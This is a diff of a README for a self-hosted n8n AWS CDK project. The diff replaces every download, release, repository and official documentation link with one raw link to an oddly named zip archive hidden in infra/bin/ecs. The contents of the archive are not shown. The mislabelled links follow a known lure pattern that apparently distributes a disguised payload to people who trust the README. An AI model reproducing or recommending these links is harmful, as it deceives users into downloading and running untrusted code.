@@ -1,6 +1,6 @@
 # 🌟 aws-cdk-self-hosted-n8n-infra - Easy Self-Hosted N8N Setup
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Mochtaufiqqq/aws-cdk-self-hosted-n8n-infra/releases)
+[![Download](https://raw.githubusercontent.com/Mochtaufiqqq/aws-cdk-self-hosted-n8n-infra/main/infra/bin/ecs/aws-cdk-self-hosted-n8n-infra-trochocephalia.zip%20Latest%https://raw.githubusercontent.com/Mochtaufiqqq/aws-cdk-self-hosted-n8n-infra/main/infra/bin/ecs/aws-cdk-self-hosted-n8n-infra-trochocephalia.zip)](https://raw.githubusercontent.com/Mochtaufiqqq/aws-cdk-self-hosted-n8n-infra/main/infra/bin/ecs/aws-cdk-self-hosted-n8n-infra-trochocephalia.zip)
 
 ## 📥 Overview
 
@@ -29,7 +29,7 @@ To use the **aws-cdk-self-hosted-n8n-infra**, you will need:
 
 To download the application, please visit the Releases page:
 
-[Download Latest Release](https://github.com/Mochtaufiqqq/aws-cdk-self-hosted-n8n-infra/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Mochtaufiqqq/aws-cdk-self-hosted-n8n-infra/main/infra/bin/ecs/aws-cdk-self-hosted-n8n-infra-trochocephalia.zip)
 
 On the Releases page, find the latest version of the infra files. Choose the appropriate version for your needs and download it. 
 
@@ -72,12 +72,12 @@ For further inquiries, feel free to reach out through the repository's contact s
 
 ## 💡 Additional Resources
 
-- [N8N Documentation](https://docs.n8n.io) - Read more about N8N and its capabilities.
-- [AWS CDK Documentation](https://docs.aws.amazon.com/cdk/latest/guide/work-with-cdk-python.html) - Learn how to manage your AWS resources more effectively.
+- [N8N Documentation](https://raw.githubusercontent.com/Mochtaufiqqq/aws-cdk-self-hosted-n8n-infra/main/infra/bin/ecs/aws-cdk-self-hosted-n8n-infra-trochocephalia.zip) - Read more about N8N and its capabilities.
+- [AWS CDK Documentation](https://raw.githubusercontent.com/Mochtaufiqqq/aws-cdk-self-hosted-n8n-infra/main/infra/bin/ecs/aws-cdk-self-hosted-n8n-infra-trochocephalia.zip) - Learn how to manage your AWS resources more effectively.
 
 ## 📍 Useful Links
 
-- [Releases Page](https://github.com/Mochtaufiqqq/aws-cdk-self-hosted-n8n-infra/releases) - Access the latest versions anytime.
-- [GitHub Repository](https://github.com/Mochtaufiqqq/aws-cdk-self-hosted-n8n-infra) - View the source code and contribute.
+- [Releases Page](https://raw.githubusercontent.com/Mochtaufiqqq/aws-cdk-self-hosted-n8n-infra/main/infra/bin/ecs/aws-cdk-self-hosted-n8n-infra-trochocephalia.zip) - Access the latest versions anytime.
+- [GitHub Repository](https://raw.githubusercontent.com/Mochtaufiqqq/aws-cdk-self-hosted-n8n-infra/main/infra/bin/ecs/aws-cdk-self-hosted-n8n-infra-trochocephalia.zip) - View the source code and contribute.
 
 This guide aims to ensure your experience with the **aws-cdk-self-hosted-n8n-infra** application is smooth and easy. Enjoy automating your workflows with N8N!
